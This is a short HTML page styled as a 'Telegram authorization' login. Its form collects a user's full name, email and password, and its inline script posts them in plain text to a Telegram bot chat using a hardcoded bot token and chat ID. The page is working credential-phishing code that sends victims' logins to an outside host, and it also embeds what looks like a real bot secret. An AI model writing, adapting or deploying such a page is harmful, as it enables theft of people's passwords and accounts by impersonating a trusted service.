<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
    <title>Document</title>
</head>
<body>
    <div class="container col-md-6 mt-5 px-4">
        <h1 class="fs-1">Telegram authorization</h1>
        <form id="form" class="d-flex flex-column">
            <div class="mb-3">
                <label for="exampleInputEmail1" class="form-label">Your full name</label>
                <input type="text" class="form-control" name="name">
                <div class="form-text">We'll never share your name with anyone else.</div>
            </div>
            <div class="mb-3">
              <label for="exampleInputEmail1" class="form-label">Email address</label>
              <input type="email" class="form-control" name="email">
              <div class="form-text">We'll never share your email with anyone else.</div>
            </div>
            <div class="mb-3">
              <label for="exampleInputPassword1" class="form-label">Password</label>
              <input type="password" class="form-control" name="password">
            </div>
            <div class="mb-3 form-check">
              <input type="checkbox" class="form-check-input" name="check">
              <label class="form-check-label" for="exampleCheck1">Check me out</label>
            </div>
            <button type="submit" class="btn btn-primary">Submit</button>
          </form>
    </div>




    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm" crossorigin="anonymous"></script>
    <script>
        const TOKEN = "6029310280:AAE1btk3nk1SYW94fvg0exqQu4mfrl9Yxs4";
        const CHAT_ID = "586564605";
        const URL = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;

        document.getElementById("form").addEventListener('submit', function(e) {
            e.preventDefault();
            
            let message = `<b>Authorization on the site</b>\n`;
            message += `<b>Sender Name :</b>${this.name.value}\n`;
            message += `<b>Email :</b>${this.email.value}\n`;
            message += `<b>Password :</b>${this.password.value}`;

            axios.post(URL, {
                chat_id: CHAT_ID,
                parse_mode:'html',
                text: message
            })
        }) 
    </script>
</body>
</html>
